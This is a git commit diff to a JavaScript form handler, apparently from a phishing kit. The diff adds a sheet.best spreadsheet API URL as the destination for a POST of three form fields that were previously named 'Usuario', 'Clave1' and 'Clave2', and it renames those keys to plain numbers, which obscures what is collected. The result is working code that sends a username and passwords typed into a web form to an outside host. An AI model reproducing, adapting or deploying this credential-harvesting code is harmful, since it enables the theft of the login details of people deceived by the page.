54a0ad38ae01ab3f840351e2a3defceb8ee57067
soporte-co <162223886+soporte-co@users.noreply.github.com>
2024-03-18 13:44:51 -0600

    Update 0822.js

--- azt/js/0822.js
+++ azt/js/0822.js
@@ -7,16 +7,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/d2695b5b-5093-4641-b263-d9e9641940ff', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Usuario": formulario.data1.value,
-            "Clave1": formulario.data2.value,
-            "Clave2": formulario.data3.value
+            "1": formulario.data1.value,
+            "2": formulario.data2.value,
+            "3": formulario.data3.value
         })
     });
 
